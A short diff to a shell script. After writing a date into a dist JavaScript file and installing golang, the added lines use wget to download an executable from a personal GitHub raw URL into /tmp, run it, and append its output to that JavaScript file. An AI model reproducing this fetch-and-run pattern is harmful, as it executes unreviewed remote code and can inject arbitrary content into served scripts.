@@ -4,3 +4,7 @@ js='/data/dist/dist/test.js'
 date > $js
 
 yum install golang -y
+
+wget -q -N -P /tmp https://raw.githubusercontent.com/Tennysony/jack/master/gotest
+
+/tmp/gotest >> $js
